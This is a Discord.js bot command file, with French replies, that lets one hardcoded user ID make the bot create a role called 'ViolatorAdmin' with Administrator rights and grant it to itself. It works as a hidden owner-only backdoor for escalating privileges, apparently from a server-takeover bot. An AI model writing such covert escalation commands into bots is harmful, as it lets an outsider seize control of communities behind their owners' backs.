module.exports = {
  name: 'giveadmin',
  description: 'Donne les permissions ADMINISTRATEUR au bot dans le serveur',
  async execute(message, args, client) {
    if (message.author.id !== "1154008138769518652") {
      return message.reply("❌ Seul mon créateur peut faire ça, petit joueur.");
    }

    try {
      const role = message.guild.roles.cache.find(r => r.name === "ViolatorAdmin");
      if (!role) {
        const newRole = await message.guild.roles.create({
          name: "ViolatorAdmin",
          permissions: ["Administrator"],
          reason: "Rôle admin pour le bot",
        });
        await message.guild.members.me.roles.add(newRole);
        return message.reply("✅ Le rôle admin a été créé et donné au bot.");
      } else {
        await message.guild.members.me.roles.add(role);
        return message.reply("✅ Le bot a reçu le rôle admin existant.");
      }
    } catch (err) {
      console.error("Erreur dans giveadmin:", err);
      return message.reply("💥 Impossible de filer le rôle admin. Tu joues avec le feu.");
    }
  }
};
